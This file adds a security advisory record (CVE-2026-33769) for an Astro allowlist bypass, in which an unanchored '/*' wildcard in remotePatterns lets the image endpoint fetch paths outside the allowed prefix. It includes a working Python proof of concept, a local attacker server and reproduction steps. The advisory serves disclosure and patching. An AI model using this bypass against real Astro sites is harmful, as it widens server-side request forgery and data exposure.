@@ -1,0 +1,207 @@
+advisory_id: GHSA-g735-7g2w-hh3f
+datasource_id: github_osv_importer_v2/GHSA-g735-7g2w-hh3f
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-g735-7g2w-hh3f/GHSA-g735-7g2w-hh3f.json
+aliases:
+  - CVE-2026-33769
+summary: |
+  Astro: Remote allowlist bypass via unanchored matchPathname wildcard
+  ## Summary
+  This issue concerns Astro's `remotePatterns` path enforcement for remote URLs used by server-side fetchers such as the image optimization endpoint. The path matching logic for `/*` wildcards is unanchored, so a pathname that contains the allowed prefix later in the path can still match. As a result, an attacker can fetch paths outside the intended allowlisted prefix on an otherwise allowed host. In our PoC, both the allowed path and a bypass path returned 200 with the same SVG payload, confirming the bypass.
+
+  ## Impact
+  Attackers can fetch unintended remote resources on an allowlisted host via the image endpoint, expanding SSRF/data exposure beyond the configured path prefix.
+
+  ## Description
+  Taint flow: request -> `transform.src` -> `isRemoteAllowed()` -> `matchPattern()` -> `matchPathname()`
+
+  User-controlled `href` is parsed into `transform.src` and validated via `isRemoteAllowed()`:
+
+  Source: https://github.com/withastro/astro/blob/e0f1a2b3e4bc908bd5e148c698efb6f41a42c8ea/packages/astro/src/assets/endpoint/generic.ts#L43-L56
+
+  ```ts
+  const url = new URL(request.url);
+  const transform = await imageService.parseURL(url, imageConfig);
+
+  const isRemoteImage = isRemotePath(transform.src);
+
+  if (isRemoteImage && isRemoteAllowed(transform.src, imageConfig) === false) {
+    return new Response('Forbidden', { status: 403 });
+  }
+  ```
+
+  `isRemoteAllowed()` checks each `remotePattern` via `matchPattern()`:
+
+  Source: https://github.com/withastro/astro/blob/e0f1a2b3e4bc908bd5e148c698efb6f41a42c8ea/packages/internal-helpers/src/remote.ts#L15-L21
+
+  ```ts
+  export function matchPattern(url: URL, remotePattern: RemotePattern): boolean {
+    return (
+      matchProtocol(url, remotePattern.protocol) &&
+      matchHostname(url, remotePattern.hostname, true) &&
+      matchPort(url, remotePattern.port) &&
+      matchPathname(url, remotePattern.pathname, true)
+    );
+  }
+  ```
+
+  The vulnerable logic in `matchPathname()` uses `replace()` without anchoring the prefix for `/*` patterns:
+
+  Source: https://github.com/withastro/astro/blob/e0f1a2b3e4bc908bd5e148c698efb6f41a42c8ea/packages/internal-helpers/src/remote.ts#L85-L99
+
+  ```ts
+  } else if (pathname.endsWith('/*')) {
+    const slicedPathname = pathname.slice(0, -1); // * length
+    const additionalPathChunks = url.pathname
+      .replace(slicedPathname, '')
+      .split('/')
+      .filter(Boolean);
+    return additionalPathChunks.length === 1;
+  }
+  ```
+
+  **Vulnerable code flow:**
+  1. `isRemoteAllowed()` evaluates `remotePatterns` for a requested URL.
+  2. `matchPathname()` handles `pathname: "/img/*"` using `.replace()` on the URL path.
+  3. A path such as `/evil/img/secret` incorrectly matches because `/img/` is removed even when it's not at the start.
+  4. The image endpoint fetches and returns the remote resource.
+
+  ## PoC
+
+  The PoC starts a local attacker server and configures remotePatterns to allow only `/img/*`. It then requests the image endpoint with two URLs: an allowed path and a bypass path with `/img/` in the middle. Both requests returned the SVG payload, showing the path restriction was bypassed.
+
+  ### Vulnerable config
+  ```js
+  import { defineConfig } from 'astro/config';
+  import node from '@astrojs/node';
+
+  export default defineConfig({
+    output: 'server',
+    adapter: node({ mode: 'standalone' }),
+    image: {
+      remotePatterns: [
+        { protocol: 'https', hostname: 'cdn.example', pathname: '/img/*' },
+        { protocol: 'http', hostname: '127.0.0.1', port: '9999', pathname: '/img/*' },
+      ],
+    },
+  });
+  ```
+
+  ### Affected pages
+  This PoC targets the `/_image` endpoint directly; no additional pages are required.
+
+  ### PoC Code
+  ```python
+  import http.client
+  import json
+  import urllib.parse
+
+  HOST = "127.0.0.1"
+  PORT = 4321
+
+  def fetch(path: str) -> dict:
+      conn = http.client.HTTPConnection(HOST, PORT, timeout=10)
+      conn.request("GET", path, headers={"Host": f"{HOST}:{PORT}"})
+      resp = conn.getresponse()
+      body = resp.read(2000).decode("utf-8", errors="replace")
+      conn.close()
+      return {
+          "path": path,
+          "status": resp.status,
+          "reason": resp.reason,
+          "headers": dict(resp.getheaders()),
+          "body_snippet": body[:400],
+      }
+
+  allowed = urllib.parse.quote("http://127.0.0.1:9999/img/allowed.svg", safe="")
+  bypass = urllib.parse.quote("http://127.0.0.1:9999/evil/img/secret.svg", safe="")
+
+  # Both pass, second should fail
+
+  results = {
+      "allowed": fetch(f"/_image?href={allowed}&f=svg"),
+      "bypass": fetch(f"/_image?href={bypass}&f=svg"),
+  }
+
+  print(json.dumps(results, indent=2))
+  ```
+
+  ### Attacker server
+  ```python
+  from http.server import BaseHTTPRequestHandler, HTTPServer
+
+  HOST = "127.0.0.1"
+  PORT = 9999
+
+  PAYLOAD = """<svg xmlns=\"http://www.w3.org/2000/svg\">
+    <text>OK</text>
+  </svg>
+  """
+
+  class Handler(BaseHTTPRequestHandler):
+      def do_GET(self):
+          print(f">>> {self.command} {self.path}")
+          if self.path.endswith(".svg") or "/img/" in self.path:
+              self.send_response(200)
+              self.send_header("Content-Type", "image/svg+xml")
+              self.send_header("Cache-Control", "no-store")
+              self.end_headers()
+              self.wfile.write(PAYLOAD.encode("utf-8"))
+              return
+
+          self.send_response(200)
+          self.send_header("Content-Type", "text/plain")
+          self.end_headers()
+          self.wfile.write(b"ok")
+
+      def log_message(self, format, *args):
+          return
+
+  if __name__ == "__main__":
+      server = HTTPServer((HOST, PORT), Handler)
+      print(f"HTTP logger listening on http://{HOST}:{PORT}")
+      server.serve_forever()
+  ```
+
+  ### PoC Steps
+  1. Bootstrap default Astro project.
+  2. Add the vulnerable config and attacker server.
+  3. Build the project.
+  4. Start the attacker server.
+  5. Start the Astro server.
+  6. Run the PoC.
+  7. Observe the console output showing both the allowed and bypass requests returning the SVG payload.
+impacted_packages:
+  - purl: pkg:npm/astro
+    affected_versions: vers:npm/>=2.10.10|<5.18.1
+    fixed_versions: vers:npm/5.18.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '5.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-g735-7g2w-hh3f/GHSA-g735-7g2w-hh3f.json
+  - score: '2.9'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N/E:P
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-g735-7g2w-hh3f/GHSA-g735-7g2w-hh3f.json
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-20
+  - CWE-183
+references:
+  - url: https://github.com/withastro/astro
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-33769
+    reference_type:
+    reference_id:
+  - url: https://github.com/withastro/astro/security/advisories/GHSA-g735-7g2w-hh3f
+    reference_type: other
+    reference_id: GHSA-g735-7g2w-hh3f
